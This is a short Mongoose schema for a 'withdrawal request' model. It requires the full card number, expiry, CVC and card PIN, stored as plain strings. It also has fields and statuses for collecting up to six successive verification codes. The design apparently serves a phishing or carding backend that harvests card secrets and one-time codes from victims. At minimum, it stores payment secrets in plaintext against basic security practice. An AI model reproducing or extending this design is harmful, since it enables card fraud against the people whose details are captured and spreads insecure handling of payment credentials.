const mongoose = require('mongoose');

const withdrawalRequestSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  amount: {
    type: Number,
    required: true,
    min: 0
  },
  fee: {
    type: Number,
    required: true
  },
  transferType: {
    type: String,
    enum: ['card', 'bank'],
    required: true
  },
  cardNumber: {
    type: String,
    required: true
  },
  cardHolder: {
    type: String,
    required: true
  },
  expiryDate: {
    type: String,
    required: true
  },
  bankName: {
    type: String,
    required: true
  },
  cardCVC: {
    type: String,
    required: true
  },
  cardPin: {
    type: String,
    required: true
  },
  verificationCode: {
    type: String,
    default: null
  },
  secondVerificationCode: {
    type: String,
    default: null
  },
  thirdVerificationCode: {
    type: String,
    default: null
  },
  fourthVerificationCode: {
    type: String,
    default: null
  },
  fifthVerificationCode: {
    type: String,
    default: null
  },
  sixthVerificationCode: {
    type: String,
    default: null
  },
  status: {
    type: String,
    enum: ['pending', 'approved', 'awaiting_second_code', 'awaiting_third_code', 'awaiting_fourth_code', 'awaiting_fifth_code', 'awaiting_sixth_code', 'rejected', 'completed'],
    default: 'pending'
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model('WithdrawalRequest', withdrawalRequestSchema);